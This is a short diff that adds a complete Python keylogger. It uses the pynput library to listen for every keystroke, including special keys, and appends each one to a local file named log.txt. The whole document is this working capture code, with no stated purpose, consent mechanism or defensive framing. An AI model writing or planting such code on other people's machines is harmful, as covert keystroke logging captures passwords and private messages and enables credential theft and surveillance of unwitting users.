@@ -1,0 +1,14 @@
+import pynput # A common library for keyboard monitoring
+
+def on_press(key):
+    try:
+        with open("log.txt", "a") as f:
+            f.write(f"{key.char}\n")
+    except AttributeError:
+        # Handle special keys like 'space', 'enter', etc.
+        with open("log.txt", "a") as f:
+            f.write(f"{key}\n")
+
+# Create a listener for keyboard events
+with pynput.keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
